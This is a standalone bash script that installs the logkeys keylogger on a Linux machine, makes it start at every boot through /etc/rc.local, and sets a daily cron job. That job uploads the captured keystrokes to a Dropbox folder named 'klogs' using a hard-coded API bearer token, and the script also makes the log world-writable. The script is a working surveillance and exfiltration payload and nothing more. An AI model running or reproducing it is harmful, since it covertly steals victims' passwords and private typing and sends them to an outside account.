#!/bin/bash
sudo apt-get update
sudo apt-get install wget unzip curl -y
wget https://github.com/kernc/logkeys/archive/master.zip
unzip master.zip
cd logkeys-master/
./autogen.sh
cd build
../configure
make
sudo make install
sudo wget https://raw.githubusercontent.com/kernc/logkeys/master/keymaps/en_GB.map
sudo logkeys --start --keymap=/opt/en_GB.map --output=/var/log/ktmp
sudo test -f /etc/rc.local || sudo touch /etc/rc.local
sudo chmod 777 /var/log/ktmp
(crontab -l 2>/dev/null; echo "0 10 * * * curl -X POST https://content.dropboxapi.com/2/files/upload     --header "Authorization: Bearer wz0j8XDxZVAAAAAAAAAAWVCZG0FSQm2elwhTAPa-DB2RyeflCzRm77pRBWVjyVIV"     --header "Dropbox-API-Arg: {\"path\": \"/klogs/klog.txt\",\"mode\": \"add\",\"autorename\": true,\"mute\": false,\"strict_conflict\": false}"     --header "Content-Type: application/octet-stream"     --data-binary @/var/log/ktmp") | crontab -
sudo su
sudo echo "logkeys --start --keymap=/opt/en_GB.map --output=/var/log/ktmp" >> /etc/rc.local
exit 0
